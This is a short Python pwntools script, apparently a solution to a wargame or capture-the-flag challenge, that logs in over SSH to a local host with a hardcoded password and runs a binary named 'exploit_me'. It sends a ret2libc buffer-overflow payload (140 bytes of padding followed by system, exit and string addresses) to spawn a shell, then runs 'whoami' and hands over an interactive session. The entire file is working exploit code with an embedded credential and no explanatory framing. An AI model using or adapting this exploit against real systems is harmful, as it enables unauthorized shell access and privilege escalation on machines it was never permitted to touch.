
#!/usr/bin/env python3

from pwn import *
import os

cwd = os.getcwd()
host = "192.168.1.22"
port = 22

login = "zaz"
binary = "exploit_me"
password = "646da671ca01bb5d84dbb5fb2238dc8e"
remotebinary = "/home/%s/%s" % (login, binary)

shell = ssh(host=host, port=port, user=login, password=password)

system_addr = p32(0xb7e6b060)
exit_addr = p32(0xb7e5ebe0)
str_addr = p32(0xb7f8cc58)
padding = b"B"*140

payload = padding + system_addr + exit_addr + str_addr

p = shell.process([remotebinary, payload], env={})
p.clean()
p.sendline("whoami")
p.interactive()
